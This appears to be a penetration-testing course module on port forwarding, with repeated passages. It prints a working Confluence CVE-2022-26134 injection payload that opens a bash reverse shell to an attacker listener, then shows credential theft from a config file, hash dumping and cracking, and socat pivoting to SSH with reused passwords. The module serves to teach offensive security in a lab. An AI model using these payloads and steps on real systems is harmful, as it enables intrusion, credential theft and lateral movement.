During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

